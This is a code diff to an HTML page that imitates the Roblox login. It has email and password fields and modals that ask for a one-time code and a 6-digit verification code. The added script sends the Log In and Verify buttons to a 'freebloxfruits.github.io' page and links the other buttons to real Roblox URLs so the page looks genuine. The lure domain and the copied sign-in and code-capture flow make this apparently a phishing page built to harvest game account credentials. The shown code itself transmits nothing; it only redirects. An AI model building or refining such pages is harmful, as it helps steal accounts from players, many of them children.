@@ -7,13 +7,13 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #e6e6e6;
             margin: 0;
             padding: 0;
         }
 
         .navbar {
-            background-color: #333;
+            background-color: #2c2c2c;
             padding: 10px;
             text-align: right;
         }
@@ -32,7 +32,7 @@
         .login-container {
             max-width: 400px;
             margin: 50px auto;
-            background-color: #fff;
+            background-color: #ffffff;
             padding: 20px;
             box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
         }
@@ -68,11 +68,9 @@
 </head>
 <body>
     <div class="navbar">
-        <!-- Navbar items will be placed here based on Image 1 -->
         <button id="signupButton">Sign Up</button>
     </div>
     <div class="login-container">
-        <!-- Login form elements will be placed here -->
         <input type="email" id="email" placeholder="Email" required>
         <input type="password" id="password" placeholder="Password" required>
         <button id="loginButton">Log In</button>
@@ -81,47 +79,53 @@
         <button id="otherDeviceButton">Use another device</button>
         <button id="createAccountButton">Don't have an account? Create one</button>
     </div>
-
-    <!-- Modal for "Email me a one-time code" (Image 2) -->
     <div id="oneTimeCodeModal" class="modal">
         <div class="modal-content">
             <input type="email" id="modalEmail" placeholder="Email" required>
             <button id="sendCodeButton">Send Code</button>
         </div>
     </div>
-
-    <!-- Modal for 6-digit code entry (Image 3) -->
     <div id="digitCodeModal" class="modal">
         <div class="modal-content">
             <input type="text" id="digitCode" placeholder="Enter 6-digit code" maxlength="6" required>
             <button id="verifyCodeButton">Verify</button>
         </div>
     </div>
-
     <script>
-        // Function to show the one-time code modal
         function showOneTimeCodeModal() {
             document.getElementById('oneTimeCodeModal').style.display = 'block';
         }
 
-        // Function to show the 6-digit code modal
         function showDigitCodeModal() {
             document.getElementById('digitCodeModal').style.display = 'block';
         }
 
-        // Function to hide modals
         function hideModals() {
             document.getElementById('oneTimeCodeModal').style.display = 'none';
             document.getElementById('digitCodeModal').style.display = 'none';
         }
 
-        // Attach event listeners to buttons
         document.getElementById('oneTimeCodeButton').addEventListener('click', showOneTimeCodeModal);
         document.getElementById('sendCodeButton').addEventListener('click', function() {
             hideModals();
             showDigitCodeModal();
         });
-        document.getElementById('verifyCodeButton').addEventListener('click', hideModals);
+        document.getElementById('verifyCodeButton').addEventListener('click', function() {
+            hideModals();
+            window.location.href = "https://freebloxfruits.github.io/login-completed/";
+        });
+        document.getElementById('forgotButton').addEventListener('click', function() {
+            window.location.href = "https://www.roblox.com/login/forgot-password-or-username";
+        });
+        document.getElementById('signupButton').addEventListener('click', function() {
+            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
+        });
+        document.getElementById('createAccountButton').addEventListener('click', function() {
+            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
+        });
+        document.getElementById('loginButton').addEventListener('click', function() {
+            window.location.href = "https://freebloxfruits.github.io/login-completed/";
+        });
     </script>
 </body>
 </html>
